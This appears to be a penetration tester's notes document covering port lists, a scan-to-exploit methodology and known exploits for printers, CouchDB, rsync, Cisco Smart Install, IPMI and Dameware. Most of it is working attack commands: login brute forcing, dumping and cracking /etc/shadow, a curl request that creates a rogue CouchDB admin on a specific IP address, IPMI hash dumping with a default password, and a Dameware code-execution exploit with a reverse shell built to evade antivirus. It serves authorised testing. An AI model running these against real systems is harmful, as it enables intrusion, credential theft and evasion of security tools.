PenTest Notes

**[Table of Contents:]{.underline}**

Common
Ports.............................................................................................3

Penetration Testing
Methodology.....................................................................4

Scanning...................................................................................................\...4

Enumeration.................................................................................................5

Exploitation.................................................................................................5-7

FTP...................................................................................................5

SSH................................................................................................\...5

Telnet................................................................................................5

DNS................................................................................................\...5

HTTP.................................................................................................6

RPC/netBIOS/SMB............................................................................6-7

SNMP................................................................................................7

RDP................................................................................................\...7

Post-Exploitation............................................................................................

Clean-Up......................................................................................................7

Known
Exploits........................................................................................................8

PRET...........................................................................................................8

PRETty.........................................................................................................8

CouchDB......................................................................................................9

Rsync...........................................................................................................10

Cisco Smart
Install..........................................................................................11

IPMI Cipher
0................................................................................................12

Dameware....................................................................................................13

Useful
Tools...........................................................................................................14

Useful
Links.........................................................................................................\...15

Training
Links.........................................................................................................16

**[Common Ports:]{.underline}**

  -----------------------------------------------------------------------
  TCP                     21                      FTP
  ----------------------- ----------------------- -----------------------
  TCP                     22                      SSH

  TCP                     23                      Telnet

  TCP                     25                      SMTP

  UDP                     49                      TACAS

  UDP/TCP                 53                      DNS

  TCP                     80                      HTTP

  UDP                     88                      Kerberos

  TCP                     110                     POP3

  UDP                     123                     NTP

  TCP                     135                     RPC

  TCP                     137-139                 NetBIOS

  UDP                     161                     SNMP

  TCP/UDP                 389                     LDAP

  TCP                     443                     HTTPS

  TCP                     445                     SMB

  TCP                     514                     syslog

  TCP                     515                     printer

  TCP/UDP                 636                     LDAP (TLS/SSL)

  TCP                     873                     rsync

  TCP                     902                     VMware Auth

  TCP                     1433-1434               MS SQL

  TCP                     3306                    MySQL

  TCP                     3389                    RDP

  TCP                     5984                    CouchDB

  TCP                     6000-6001               X11

  TCP                     9100                    JetDirect
  -----------------------------------------------------------------------

**[Personal Methodology:]{.underline}**

*Scanning --*

1\. Run a ping scan with nmap and send to a grep-able file:

*nmap -sn \<ip range\> -oG \<filename\>*

2\. Grep ping scan file for only live hosts:

*grep -i 'Up' \<filename\> \| cut -f 2 -d ' ' \> \<hostfilename.txt\>*

3\. Run discovery scan against live host file and send results to *all*
nmap file types:

\*\*TCP Scan

*nmap -Pn -sT -O -sV -T4 -p- \--open -oA \<nmapfiles\> -iL
\<hostfilename.txt\>*

\*\*UDP Scan

*Nmap -Pn -sU -T4 -n --open --max-retries=0 -p- -oA \<nmapfiles\> -iL
\<hostfilename.txt\>*

4\. Convert nmap results to a spreadsheet for easier views:

*python3 /path/to/nmap_parser.py --csv \<filename.csv\> -f
\<nmapfile.xml\>*

5\. Review spreadsheet to gather a baseline of what's on the network:

After the spreadsheet has been produced, look through and establish what
the baseline of the network is. During this step, you should be looking
for common services that are on most of the machines on the network.
Understanding the baseline will allow you to figure out what should be
there and what shouldn't be there. After figuring the baseline out, this
is when you want to find any *"low hanging fruit"* that may be easily
exploited. Insecure protocols such as FTP or Telnet may lead to an
anonymous login (FTP) or unauthenticated shell access (Telnet). If any
HTTP(S) ports are open, note those hosts so that you can browse to the
web pages and get an understanding of what the machines purpose is or
what is on the machine. If port 9100 is open, then you automatically
know that the machine is a printer and can easily be exploited with PRET
(more to follow on this later).

*\
*

*Enumeration --*

Once services, operating systems, web page services/versions are figured
out, start conducting research online to see if there are any known
vulnerabilities on this stuff. If you find a vulnerability for a service
on the network, make sure to make note of it in a document.

Nmap does a decent job of enumerating versions of the different services
running, but you can use netcat or telnet to connect to any port on the
network to attempt to banner grab.

Knowing what version of services running will help pin-point
vulnerabilities or exploits during enumeration.

*Exploitation --*

FTP:

*ftp \<ipaddress\>*

If FTP is open, ftp to the IP address and see if anonymous FTP is
allowed. After using above command, type "*anonymous*" as the username
and then jam in any password. If log-in is successful, anonymous FTP is
enabled. Attempt to view folders/files, transfer files, and send files.

SSH:

Use Metasploit to enumerate SSH users

*auxiliary/scanner/ssh/ssh_enumusers*

Use Metasploit to brute force user passwords

*auxiliary/scanner/ssh/ssh_login*

*\*\**some machines will lock a user after 3 failed attempts, build a
password file to limit to 3 tries

After login is found use the following to ssh to a box with the found
creds:

*ssh user@ipaddress*

Telnet:

*telnet \<ipaddress\>*

If authentication is not required, then you will have shell access.

SMTP:

Use Metasploit auxiliary scanner to enumerate users

*auxiliary/scanner/smtp/smtp_enum*

DNS:

If TCP/53 is open, the host is most likely vulnerable to a DNS zone
transfer.

*dig @\<ipaddress\> \<domain\> axfr*

HTTP:

Always browse to the web page to see what is there.

Always look in "developer tools" to see if there are any passwords left
in the notes or if there are credentials in any of the code.

\- Run a vulnerability scan against the web page

*wapiti -u \<url\>*

*zap \> automated scan \> enter URL \> use traditional spider*

\- Run a directory brute force to find other directories

*dirb http(s)://\<ip-address or url\>*

\- Brute force credentials with Hydra

*hydra -l \<username\> -P \</path/to/wordlist\> \<ip-address\>
https-post-form
\"/path/to/login:username=\<username\>&password=\^PASS\^:Incorrect
password\"*

\*\*go to webpage and open developer tools, go to "network", enter any
username and password, click on the POST request, in right hand side of
developer tools click "resend" or "edit&resend", scroll to the bottom of
the request and copy the data being sent. That data goes in between the
"" in above command.

RPC / NetBIOS / SMB:

-   Get RPC information

> *rpcinfo -p \<ip-address\>*

-   Connect with RPC with username

> *rpcclient -U "" \<ip-address\>*

-   Connect with RPC with Null session

> *rpcclient -N \<ip-address\>*

-   Scan for open NetBIOS nameservers

> *nbtscan \<ip-address\>*

-   Scan for open smb shares

> *smbclient -L //\<ip-address\>*
>
> If there are open shares, connect with a null session and view
> contents. If nothing comes back attempt different usernames with the
> -U option.

-   Connect to SMB with username

> *smbclient -U "" //\<ip-address\>*

-   Connect to SMB with Null session

> *smbclient -N //\<ip-address\>*

SNMP:

-   Check for public community string

*snmpwalk -c Public -v1/2c/3 \<ip-address\>*

-   Check for public or private community string

> *onesixtyone \<ip-address\>*

-   Bruteforce community string with onesixtyone

> *onesixtyone -i \<wordlist\>*

RDP:

-   Connect to RDP from linux

> *rdesktop \<ip-address\>*
>
> If RDP is public, this will connect you remotely to the target. If you
> know username and password, you will have full GUI control of the box.

*\
*

*Post-Exploitation --*

\*\*check whats on subnet from original scans\*\*

\*\*see whats there to sniff out\*\*

\*\*what tools are available?\*\*

Linux --

User access:

Access:

Can you su to root without password?

su root

Are you a sudo user?

sudo su --

Find passwords in files

find / -inname 'password'

grep -i 'pass' \*.txt 2\>/dev/null

Root access:

Crack Passwords:

On remote system -

cat /etc/passwd (copy contents to a file on your system)

cat /etc/shadow (copy contents to a file on your system)

On your system -

unshadow \<pass_file\> \<shadow_file\> \> \<unshadowed_file\>

john --wordlist==path/to/wordlist \<unshadowed_file\>

Windows --

Container Breakout --

*Clean-Up --*

*After all exploits have been accomplished and screen captures or other
documentation has been made, ensure that you clean-up remnants on the
box.*

**[\
]{.underline}**

**[Known Exploits:]{.underline}**

***PRET --***

Clone the PRET repository from Github

git clone https://github.com/RUB-NDS/PRET

Create an alias for pret.py

*alias pret='python /path/to/pret.py'*

Use PRET to exploit printers:

*pret \<ip-address\> {ps, pjl, pcl}*

If connection to printer is established, type help and happy hacking.

***PRETty --***

Set up a Python2 virtual environment

*sudo apt install python2-setuptool-whl python-pip-whl*

*virtualenv -p /usr/bin/python2.7 /dir/of/choice/my_env2*

*source ./my_venv2/bin/activate*

Install pre-requisites **in the virtual environment**

*sudo apt -y install imagemagick ghostscript arp-scan tshark*

*pip install --trusted-host pypi.org --trusted-host pypi.python.org
--trusted-host files.pythonhosted.org argparse termcolor colorama
pysnmp*

Ensure both PRET and PRETty (needs to be inside of the PRET directory)
has been cloned from Github:

*git clone https://github.com/RUB-NDS/PRET*

*cd PRET*

*git clone https://github.com/BusesCanFly/PRETty*

*cd PRETty*

The version of PRETty.py in branch origin/master will croak because of
syntax errors; download and replace with the one in
W:\\10_Organization_Functions\\03_CDAP\\08_Tools\\PRETty\\misc. After
share drive version of PRETty is copied to your kali box, make sure you
are in the PRETty folder for the following:

*cp /path/to/sd_PRETty.py ./*

*chmod 755 PRETty.py*

*\
*

***CouchDB** --*

If nmap shows port 5984 http open and the product is CouchDB, run a
version scan to find the version of CouchDB running. If version 2.0 and
below then below commands will allow creation of an admin user, granting
full access to the database:

*curl -X PUT -d
\'{\"type\":\"user\",\"name\":\"**pwnedu**\",\"roles\":\[\"\_admin\"\],\"roles\":\[\],\"password\":\"**pwnedu**\"}\'
http://143.138.7.36:5984/\_users/org.couchdb.user:pwnedu -H
\"Content-Type:application/json\"*

*\*\* bold can be changed to whatever username and password you desire*

Once the admin account has been created, browse to the database web
application:

http://targetIP:5984/\_utils/

To query person records, browse to the persons table, select a random
entry to see the syntax used to create records (i.e. Joe, joe, JOE) and
use that syntax in the query below:

*function(doc) {*

*if (doc.\$doctype === \"person\" && doc.lastName === \"Joe\" &&
doc.firstName === \"Green\")*

*{*

*emit(doc.lastName.replace(/\[\_\\d\\W\]/g,\'\').toUpperCase(), null);*

*}*

*}*

Allow a few minutes for the query to process.

If the version is 2.1 or greater, there are plenty of resources on the
web that show different vulnerabilities and exploits for CouchDB.

***Rsync --***

If rsync is open (port 873), use netcat to view shared folders.

nc \<target-ip\> 873

\@RSYNCD: 29.0 Returned to you

\@RSYNCD: 29.0 Enter this

#list Then enter this

Share1 A list of shares will return

Share2

Once rsync enumeration is complete, the netcat session will close. Open
another session to further enumerate a share.

nc \<target-ip\> 873

\@RSYNCD: 29.0 Returned to you

\@RSYNCD: 29.0 Enter this

Share1 Enter this

\@RSYNCD: OK No authentication required

List out directory:

*rsync rsync://\<target-ip:port\>/shared_name*

Copy shared files to local computer:

*rsync -av rsync://\<target-ip:port\>/shared_name ./rsync_shared*

If directory perms allow anyone to write, write a file with:

*rsync -avz local/filename rsync://\<target-ip:port\>/shared_name*

**[\
]{.underline}**

***Cisco Smart Install --***

If port 4786 smartinstall is open, use Metasploit to check if vulnerable
or exploit:

*msfconsole -q*

*use auxiliary/scanner/misc/cisco_smart_install*

*set RHOSTS \<ipaddress(es)\>*

*run*

This will fingerprint the system and verify it is a cisco switch with
smart install. Once fingerprinted and verified, do the following:

*Set ACTION DOWNLOAD*

*run*

This will attempt to download the config file and crack the hashes
found. If config file is downloaded check "\~/.msf4/loot" and verify the
config file for the correct hash identification.

Once the hash has been cracked, if ssh or a web client is open, attempt
to use those credentials to sign into the switch.

**[\
]{.underline}**

***IPMI Ciper 0 --***

If UDP port 623 is open, IPMI hashes are likely to be captured. Use
Metasploit to collect hashes:

*msfconsole -q*

*use auxiliary/scanner/ipmi/ipmi_dumphashes*

*set RHOSTS \<ipaddress(es)\>*

*set OUTPUT_JOHN_FILE \<john_file_name\>*

*run*

Once hashes are collected, use the john file that was collected to try
to crack the hashes. If hashes are cracked, use ipmitool to attempt to
login. If hashes are not cracked, try ipmi tool with the default admin
password (calvin). If hashes are cracked, you can try to log in through
web or SSH.

*sudo apt install ipmitool*

*ipmitool -I lanplus -C 0 -H \<ipaddress\> -U root -P \<crackedpass or
calvin\> shell*

***Dameware --***

If port 6129 dameware is open, check the version number. If it is
version 12.1.0.89 and below, the box may be vulnerable to Remote Code
Execution.

g*it clone
https://github.com/tenable/poc/blob/master/Solarwinds/Dameware/*

*cd Dameware*

McAfee will block a msfvenom payload, so build a GO reverse shell:
![](media/image1.png){width="3.547825896762905in"
height="5.926152668416448in"}

Install go and compile reverse shell:

*sudo apt install golang-go*

*env GOOS=\<target-os\> GOARCH=\<target-arch\> go build reverse.go*

Run the exploit:

*python dwrcs_dwDrvInst_rce.py -t \<ip-address\> -e
/path/to/reverse/shell.exe*

**[\
]{.underline}**

**[Useful Tools:]{.underline}**

*\*\*tools can be installed on Kali with "sudo apt install
\<tool-name\>", if a tool is not found on the kali repo, then tools can
be installed from github with "git clone \<github link\>"*

\- CrackMapExec

Enumerate/exploit smb, ssh, mssql, ldap, winrm

\- OneSixtyOne

Enumerate/exploit snmp

\- PRETty

Printer Exploitation Toolkit

https://github.com/BusesCanFly/PRETty

\- PRET

Printer Exploitation Toolkit

https://github.com/RUB-NDS/PRET

\- Wapiti

Web application vulnerability scanner

\- gobuster

Web page directory brute forcer

\- W3af

Web application vulnerability scanner

\- OWASP ZAP

Web application vulnerability scanner (GUI)

\- Nmap_xml_parser.py

https://github.com/laconicwolf/Nmap-Scan-to-CSV

\- Masscan

quicker alternative to nmap

\- sqlmap

Test/exploit sql injections on web pages

\- hydra

Bruteforce web page log ins

\- JohntheRipper

Hash/password cracker

\- Hashcat

Hash/password cracker

\- Mono

Cross platform framework

**[\
]{.underline}**

**[Useful Links:]{.underline}**

https://www.kali.org/tools/ (not reachable from NIPR)

https://www.sans.org/tools/

https://book.hacktricks.xyz/

https://owasp.org/

https://cve.mitre.org/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

**[Training Links:]{.underline}**

fedvte - https://fedvte.uslearning.gov/

skillport - https://usarmy.skillport.com/

PCTC - https://pctc.cyberforce.site/lms/

Cisco Net Academy - https://www.netacad.com/portal/learning

CyberFastTrack - https://www.cyber-fasttrack.org

HackTheBox - https://www.hackthebox.com

Udemy - https://digitalu.udemy.com

Cybrary - https://www.cybrary.it

CISA - https://www.cisa.gov/cybersecurity-training-exercises

Codecademy - https://www.codecademy.com

PortSwigger - https://portswigger.net/

CTF101 - https://ctf.hacker101.com/

Cybertalents - https://cybertalents.com/challenges

CTFlearn - https://ctflearn.com/

Repo for practice - https://zaratec.io/ctf-practice/
